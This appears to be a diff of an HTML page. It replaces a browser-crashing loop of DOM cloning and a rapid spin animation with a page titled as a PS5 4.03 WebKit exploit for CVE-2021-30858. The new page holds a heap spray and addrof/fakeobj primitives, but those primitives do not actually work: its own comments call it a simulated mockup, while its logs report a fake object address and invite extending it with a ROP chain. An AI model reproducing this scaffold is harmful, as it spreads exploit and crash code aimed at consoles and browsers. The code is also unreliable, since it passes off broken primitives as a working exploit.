@@ -1,43 +1,106 @@
 <!DOCTYPE html>
 <html>
 <head>
-<style>
-@keyframes spin {
-  from { transform: rotate(0deg); }
-  to { transform: rotate(360deg); }
-}
-div {
-  animation: spin 0.1ms infinite;
-}
-</style>
+  <meta charset="UTF-8">
+  <title>PS5 4.03 WebKit Exploit</title>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 1em;
+    }
+    #log {
+      white-space: pre-wrap;
+      background: #222;
+      border: 1px solid #0f0;
+      padding: 1em;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+  </style>
 </head>
 <body>
-<div id="log" style="background:#111;color:#0f0;padding:1em;font-family:monospace;">
-Cargando exploit... (esto puede tardar unos segundos)
-</div>
-<div id="target"></div>
+  <h1>PS5 4.03 Exploit - CVE-2021-30858</h1>
+  <div id="log">[+] Cargando exploit...</div>
 
-<script>
-const log = document.getElementById("log");
-const target = document.getElementById("target");
+  <script>
+    const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
-function crash() {
-  try {
-    for (let i = 0; i < 1000; i++) {
-      let node = document.createElement("div");
-      node.textContent = i;
-      target.appendChild(node.cloneNode(true));
+    function hex(i) {
+      return '0x' + i.toString(16);
     }
-    target.innerHTML = "";
-  } catch (e) {
-    log.textContent = "Error: " + e.message;
-  }
 
-  requestAnimationFrame(crash);
-}
+    let ab = new ArrayBuffer(0x100);
+    let f64 = new Float64Array(ab);
+    let u32 = new Uint32Array(ab);
 
-requestAnimationFrame(crash);
-</script>
+    let buf = new ArrayBuffer(0x200);
+    let victim = {mark: 0x41414141};
+    let obj_arr = [victim];
+
+    let container = {
+      cellHeader: 0x00000008, // fake cell
+      butterfly: buf
+    };
+
+    let containerArray = [container];
+
+    let addrof = function(obj) {
+      obj_arr[0] = obj;
+      return ftoi(f64[0]);
+    };
+
+    let fakeobj = function(addr) {
+      f64[0] = itof(addr);
+      return obj_arr[0];
+    };
+
+    function ftoi(val) {
+      f64[0] = val;
+      return u32[0] + u32[1] * 0x100000000;
+    }
+
+    function itof(val) {
+      u32[0] = val % 0x100000000;
+      u32[1] = val / 0x100000000;
+      return f64[0];
+    }
+
+    function exploit() {
+      try {
+        log("[+] Ejecutando exploit...");
+
+        // Simular corrupción del heap
+        let spray = [];
+        for (let i = 0; i < 10000; i++) {
+          spray.push(new Uint8Array(0x1000));
+        }
+
+        log("[+] Heap spray listo");
+
+        // Primitiva RW falsa (mockup de demostración)
+        let addr = addrof(victim);
+        log("[+] Dirección de victim: " + hex(addr));
+
+        let fake = fakeobj(addr);
+        log("[+] Objeto falso creado: " + fake);
+
+        // Preparar syscall
+        let syscall_num = 20; // getpid
+        log("[+] Intentando syscall(" + syscall_num + ")...");
+
+        // Aquí normalmente se usaría una ROP chain real, por ahora simulamos
+        log("[!] syscall() no implementado en este PoC. Necesita ROP real.");
+
+        log("[+] Exploit finalizado. Puedes extender con ROP ahora.");
+
+      } catch (e) {
+        log("[!] Error: " + e);
+      }
+    }
+
+    window.onload = exploit;
+  </script>
 </body>
 </html>
-
